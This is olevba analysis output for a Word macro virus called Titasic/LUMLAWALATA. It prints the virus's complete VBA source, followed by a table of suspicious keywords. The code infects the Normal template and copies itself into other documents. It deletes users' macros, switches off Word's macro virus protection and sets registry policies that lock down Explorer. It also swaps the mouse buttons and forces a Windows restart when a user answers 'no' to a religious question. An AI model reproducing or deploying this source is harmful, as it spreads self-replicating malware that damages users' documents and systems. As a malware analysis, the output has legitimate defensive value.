olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Titasic.l-848b77924780ccb994a7faa6863664fd611c6222
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Titasic.l-848b77924780ccb994a7faa6863664fd611c6222 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO lawalata.bas 
in file: Virus.MSWord.Titasic.l-848b77924780ccb994a7faa6863664fd611c6222 - OLE stream: 'Macros/VBA/lawalata'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Hi World.....
'It's my virus for you !
'My Name is LUMLAWALATA
'Thank's
'==================================
'I'm a friendly Virus always try say....
'Pray...pray....and... PRAY !!!
'I Love ISLAM !!





















Private Declare Function SwapMouseButton Lib "user32" (ByValbSwap As Long) As Long
Private Declare Function ExitWindowsEx Lib "user32" (ByVal dwReserved As Long, ByVal uRreturnCode As Long) As Long

Public AD As Object, aDes As Variant
Public NonLUMLAWALATA As Boolean, afound As Boolean, hapus As Boolean, reset As Boolean, aExc As Boolean, DocCount As Boolean
Function LumMaster()
Dim nmak(1) As String
Dim NT As Object
Dim aSrc$
On Error GoTo selesai
nmak(0) = "lawalata"
nmak(1) = "LUMLAWALATA"

aSrc = MacroContainer
Set NT = NormalTemplate
If Not DocCount Then
Set AD = ActiveDocument
ElseIf aSrc <> "LumNrml.dot" Then
aSrc = NT
End If

If aSrc = NT Then
aSrc = NT.FullName: Set aDes = AD
ElseIf aSrc = AD Then
aSrc = AD.FullName: Set aDes = NT
ElseIf aSrc = "LumNrml.dot" Then
Set aDes = NT
aSrc = Options.DefaultFilePath(8) & "\LumNrml.src"
End If

Mhapus aDes
With aDes.VBProject
If Not (Not hapus And .Description = "lawalata" And .VBComponents.Count > 2) Then
    Mcopy aSrc, aDes, nmak
    hapus = False
    .Description = "lawalata"
    If aDes = NT Then
        Options.SaveInterval = 1
        CustomizationContext = NT
        CommandBars("Tools").reset
        KeyBindings.Add KeyCode:=BuildKeyCode(77, 1024), KeyCategory:=1, _
        Command:="ToolsRecordMacroStart"
        aDes.Save
    End If
    CommandBars("Macro").Controls(2).OnAction = "ViewVbCode"
Else
GoTo Aksi
End If
End With
If afound = True Then Exit Function
Refresh
On Error Resume Next
Aksi:
If aExc = True Then Exit Function
Exit Function
selesai:
If Err.Number = 50289 Then MsgBox "Terimakasih Anda Telah" & Chr(13) & "Memproteksi Word dengan Aman", vbInformation, "LUMLAWALATA"
End Function

Sub Mhapus(Sfile)
Dim nmak As Object
For Each nmak In Sfile.VBProject.VBComponents
    If nmak.Name = "NewMacros" Then NonLUMLAWALATA = True
    If nmak.Name <> "ThisDocument" And nmak.Name <> "NewMacros" _
    And nmak.Name <> "lawalata" And nmak.Name <> "LUMLAWALATA" Then
        hapus = True
        If reset Then
        Application.OrganizerDelete Sfile.FullName, nmak.Name, 3
        Else
        nmak.CodeModule.DeleteLines 1, nmak.CodeModule.CountOfLines
        End If
    End If
Next nmak
End Sub
Sub Mcopy(Sfile, Dfile, nmak)
Dim aNmak
For Each aNmak In nmak
Application.OrganizerCopy Sfile, Dfile.FullName, aNmak, 3
Next
End Sub
Sub Action()
Documents.Add
On Error Resume Next
With ActiveWindow
.Caption = "LUMLAWALATA"
.ActivePane.View.Zoom.Percentage = 100
.View.FullScreen = Not .View.FullScreen
.DisplayRulers = False
.DisplayHorizontalScrollBar = False
.DisplayVerticalRuler = False
.DisplayVerticalScrollBar = False
.View.ShowTextBoundaries = False
    CommandBars("Full Screen").Position = 1
    With CommandBars("Full Screen").Controls(1)
    .Caption = "LUMLAWALATA," & "  " & Date
    .Style = 3
    .FaceId = 281
    End With
.View.Type = 6
Randomize
With ActiveDocument.Background.Fill
    .Visible = True
    .PresetGradient Int((6 - 1 + 1) * Rnd + 1), 1, Int((24 - 1 + 1) * Rnd + 1)
End With
LUMLAWALATA.Show
.View.FullScreen = Not .View.FullScreen
End With
CommandBars("Full Screen").reset
WBT
ActiveDocument.Close 0
WBF
End Sub
Sub FileOpen()
WBT
If Dialogs(80).Show <> 0 Then
WBF
AutoOpen
Else
WBF
End If
End Sub
Sub AutoOpen()
Application.EnableCancelKey = wdCancelDisabled
LumMaster
If Documents.Count > 1 Then
    For i = 1 To Documents.Count
    If Documents(i).Name <> ActiveDocument.Name Then
    Set AD = Documents(i)
    DocCount = True
    hapus = False
    LumMaster
    End If
    Next
End If
If Now > DateSerial(1998, 12, 12) Then Application.OnTime When:=Now + TimeValue("00:45:00"), Name:="lawalata.Action"
End
End Sub
Sub ViewVbCode()
If MsgBox("Maaf.." & Chr(13) & "Anda jangan coba-coba mengedit, merubah, ataupun menghapus makro LUMLAWALATA..!!" & Chr(13) & Chr(13) _
& "Anda hanya bisa merekam makro, menyimpan, menggunakan" & Chr(13) & "serta menghapus makro buatan Anda" & Chr(13) & Chr(13) & " Apakah Anda ingin merekam makro..?", vbExclamation + vbYesNo, "LUMLAWALATA") _
= vbYes Then Send
Keys "%m%s{down}~%d'Macro non-LUMLAWALATA'%m"
End Sub
Sub AutoExec()
On Error Resume Next
If MacroContainer <> NormalTemplate Then
aExc = True
LumMaster
WBT
AddIns.Unload False
WBF
End If
Application.EnableCancelKey = wdCancelDisabled
End Sub
Sub AutoExit()
Dim aAddin As Object
On Error GoTo batal
WBT
If Documents.Count <> 0 Then Documents.Close
Options.DefaultFilePath(2) = Options.DefaultFilePath(6)
afound = True
For Each aAddin In AddIns
    If aAddin.Name = "LumNrml.dot" Then afound = False
Next aAddin
        
If afound = True Then
Application.Visible = False
Documents.Add
LumMaster
    With ActiveDocument
        .SaveAs FileName:=Options.DefaultFilePath(8) & "\LumNrml.src", FileFormat:=wdFormatDocument, AddToRecentFiles:=False
        .SaveAs FileName:=Options.DefaultFilePath(8) & "\LumNrml.dot", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False
    End With
End If
Application.Quit
batal:
WBF
End Sub
Sub ToolsMacro()
WBF
On Error GoTo batal
Mhapus ActiveDocument
If NonLUMLAWALATA Then
    If MacroContainer = ActiveDocument Then Application.Run NormalTemplate.VBProject.Name & ".lawalata.ToolsMacro": Exit Sub
    Application.DisplayAlerts = 0
        With Dialogs(215)
        .Description = "Macros LUMLAWALATA mungkin tidak bisa Anda hapus, Anda hanya bisa menghapus makro buatan Anda (Descr: 'Makro non-LUMLAWALATA')"
        If .Display = 1 Then .Execute
        End With
    Application.DisplayAlerts = -1
Else
ViewVbCode
End If
batal:
End Sub
Sub FileTemplates()
WBF
If Not reset Then Dialogs(87).Display
End Sub
Sub FormatStyle()
WBF
Dialogs(180).Show
End Sub
Function Refresh()
reset = True
FileTemplates
Mhapus aDes
End Function
Sub AutoClose()
Application.DisplayAlerts = -1
With Options
.SaveNormalPrompt = False
.SaveInterval = 10
.VirusProtection = False
End With
If ActiveWindow.Caption <> "LUMLAWALATA" And InStr(1, ActiveDocument.Name, "Docume", 1) = 0 _
And ActiveDocument.Name <> "LumNrml.dot" Then LumMaster
End Sub
Sub FileExit()
   AutoExit
End Sub
Sub ToolsOptions()
   Options.DefaultFilePath(wdUserTemplatesPath) = "C:\Program Files\Microsoft Office\Templates"
   Dialogs(wdDialogToolsOptions).Show
   Options.DefaultFilePath(wdUserTemplatesPath) = Application.Path
End Sub
Function WBT()
   WordBasic.disableautomacros True
End Function
Function WBF()
   WordBasic.disableautomacros False
End Function
Sub Kaspo()
   System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoRun") = 1
   System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoClose") = 1
   System.PrivateProfileString("", "HKEY_LOCAL_MACINE\SOFTAWARE\Microsoft\Windows\CurrentVersion", "RegisteredOwner") = "ISLAM"
   System.PrivateProfileString("", "HKEY_LOCAL_MACINE\SOFTAWARE\Microsoft\Windows\CurrentVersion", "RegisteredOrganization") = "The Power of The World"
End Sub
Sub GantiMouse()
On Error GoTo MouseCrash
SwapMouseButton &H4
MouseCrash:
End Sub

Sub RestartWin()
On Error GoTo RestartErr
ExitWindowsEx &H2, &HFFFFFFFF
RestartErr:
End Sub

Sub TulisTeks()
On Error GoTo TulisErr
   Call barisakhir
   Selection.TypeParagraph
   Selection.Font.Bold = True
   Selection.TypeText ("Maaf jika tulisan kecil ini mengganggu kerja Anda !")
   Selection.TypeParagraph
   Selection.TypeText ("Saya hanya mengingatkan Anda untuk tidak terlalu tegang dalam bekerja")
   Selection.TypeParagraph
   Selection.TypeText ("Gunakan waktu Anda selain untuk bekerja juga untuk beristirahat dengan nyaman")
   Selection.TypeParagraph
   Selection.TypeText ("Ingat !!! WAKTU adalah UANG")
   Selection.TypeParagraph
   Selection.TypeParagraph
   Selection.Font.Italic = True
   Selection.TypeText ("LUM LAWALATA")
TulisErr:
End Sub

Sub Tanya()
On Error GoTo TanyaErr
If System.Country = 62 Then
  takon = MsgBox("Anda suka Muslim ??!?!", vbYesNo, "Assalamu'alaikum..")
Else
  takon = MsgBox("Do you like MOSLEM ??!?!", vbYesNo, "Assalamu'alaikum..")
End If

If takon = vbYes Then
  If System.Country = 62 Then
    xx = MsgBox("Semoga Allah SWT selalu bersama Anda", , "LUMLAWALATA")
  Else
    xx = MsgBox("May ALLAH SWT BLESS YOU", , "LUMLAWALATA")
  End If
Else
  Kaspo
  GantiMouse
  RestartWin
End If
TanyaErr:
End Sub
Public Sub NoMacro()
End Sub
Function barisawal()
  Selection.GoTo What:=wdGotoEnd
  Selection.InsertBreak
End Function
Function barisakhir()
  Selection.GoTo What:=wdGoToLine, Which:=wdGoToRelative, Count:=90000000
  Selection.EndKey
End Function
Sub asal()
   System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoRun") = 0
   System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoClose") = 0
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Application.Visible |May hide the application                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

